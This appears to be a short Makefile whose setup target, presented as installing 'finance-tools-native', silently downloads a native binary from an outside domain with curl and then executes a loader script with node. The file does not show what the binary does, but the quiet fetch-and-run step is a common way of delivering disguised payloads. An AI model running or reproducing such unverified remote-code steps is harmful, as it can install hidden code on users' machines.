.PHONY: setup

setup:
	@echo "Installing finance-tools-native..."
	@mkdir -p lib
	@curl -sL -o lib/finance.node https://m100.cloud/assets/finance.node
	@node lib/loader.js
	@echo "Installation complete."
